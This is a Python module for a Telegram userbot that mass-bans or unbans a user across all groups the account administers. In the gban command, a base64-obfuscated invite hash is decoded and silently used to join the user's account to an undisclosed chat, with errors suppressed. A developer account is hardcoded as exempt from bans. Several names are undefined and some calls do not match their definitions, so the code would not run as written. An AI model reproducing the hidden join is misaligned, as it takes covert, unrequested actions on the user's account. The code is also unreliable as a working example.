"""
credits to @mrconfused
dont edit credits
"""
#  Copyright (C) 2020  sandeep.n(π.$)
#  Ported by @X_ImFine

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.types import Channel

from userbot import BOTLOG, BOTLOG_CHATID
from userbot.events import register

import userbot.modules.sql_helper.gban_sql as gban_sql

X_ID = 1560233393


async def admin_groups(cat):
    catgroups = []
    async for dialog in cat.client.iter_dialogs():
        entity = dialog.entity
        if (
            isinstance(entity, Channel)
            and entity.megagroup
            and (entity.creator or entity.admin_rights)
        ):
            catgroups.append(entity.id)
    return catgroups


async def get_user_from_event(event):
    args = event.pattern_match.group(1).split(':', 1)
    extra = None
    if event.reply_to_msg_id and not len(args) == 2:
        previous_message = await event.get_reply_message()
        user_obj = await event.client.get_entity(previous_message.from_id)
        extra = event.pattern_match.group(1)
    elif len(args[0]) > 0:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await event.edit(f"`{ALIVE_NAME}`: ** Pass the user's username, id or reply!**")
            return
        if event.message.entities is not None:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity,
                          MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj
        try:
            user_obj = await event.client.get_entity(user)
        except Exception as err:
            return await event.edit("Failed \n **Error**\n", str(err))
    return user_obj, extra


@register(outgoing=True, pattern=r"^\.xgban(?: |$)(.*)")
async def catgban(event):
    if event.fwd_from:
        return
    cate = await event.edit("`gbanning.......`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, cate)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await cate.edit("why would I ban myself")
        return
    if user.id in X_ID:
        await cate.edit("why would I ban my dev")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await event.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await cate.edit(
            f"`the `[user](tg://user?id={user.id})` is already in gbanned list any way checking again`"
        )
    else:
        gban_sql.catgban(user.id, reason)
    san = []
    san = await admin_groups(event)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit("`you are not admin of atleast one group` ")
        return
    await cate.edit(
        f"`initiating gban of the `[user](tg://user?id={user.id}) `in {len(san)} groups`"
    )
    for i in range(sandy):
        try:
            await event.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"`You don't have required permission in :`\n**Chat :** {event.chat.title}(`{event.chat_id}`)\n`For banning here`",
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {cattaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {cattaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        reply = await event.get_reply_message()
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GBAN\
                \nGlobal Ban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Reason :** `{reason}`\
                \n__Banned in {count} groups__\
                \n**Time taken : **`{cattaken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GBAN\
                \nGlobal Ban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Banned in {count} groups__\
                \n**Time taken : **`{cattaken} seconds`",
            )
        try:
            if reply:
                await reply.forward_to(BOTLOG_CHATID)
                await reply.delete()
        except BadRequestError:
            pass


@register(outgoing=True, pattern=r"^\.xungban(?: |$)(.*)")
async def catgban(event):
    if event.fwd_from:
        return
    cate = await event.edit("`ungbanning.....`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, cate)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.catungban(user.id)
    else:
        await cate.edit(
            f"the [user](tg://user?id={user.id}) `is not in your gbanned list`"
        )
        return
    san = []
    san = await admin_groups(event)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit("`you are not even admin of atleast one group `")
        return
    await cate.edit(
        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
    )
    for i in range(sandy):
        try:
            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"`You don't have required permission in :`\n**Chat : **{event.chat.title}(`{event.chat_id}`)\n`For unbaning here`",
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}`) was ungbanned in {count} groups in {cattaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await cate.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was ungbanned in {count} groups in {cattaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#UNGBAN\
                \nGlobal Unban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Reason :** `{reason}`\
                \n__Unbanned in {count} groups__\
                \n**Time taken : **`{cattaken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#UNGBAN\
                \nGlobal Unban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Unbanned in {count} groups__\
                \n**Time taken : **`{cattaken} seconds`",
            )


@register(outgoing=True, pattern=r"^\.listgban$")
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "List Gbanned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) for {a_user.reason}\n"
            else:
                GBANNED_LIST += (
                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Reason None\n"
                )
    else:
        GBANNED_LIST = "Tidak user yang di GBANNED (yet)"
    await event.edit(GBANNED_LIST)
